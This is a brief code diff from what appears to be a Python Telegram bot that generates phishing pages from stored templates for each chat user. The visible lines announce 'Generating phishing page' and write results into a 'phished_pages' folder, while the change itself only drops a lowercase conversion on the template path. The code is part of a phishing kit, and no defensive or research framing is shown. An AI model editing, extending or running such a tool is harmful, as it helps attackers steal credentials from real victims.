@@ -62,7 +62,7 @@ def handle_template_selection(message):
     user_id = str(message.chat.id)
     bot.send_message(message.chat.id, f"⚙️ Generating phishing page for {template}...")
 
-    template_path = f"templates/{template.lower()}/index.html"
+    template_path = f"templates/{template}/index.html"
     output_path = f"phished_pages/{user_id}"
     os.makedirs(output_path, exist_ok=True)
 
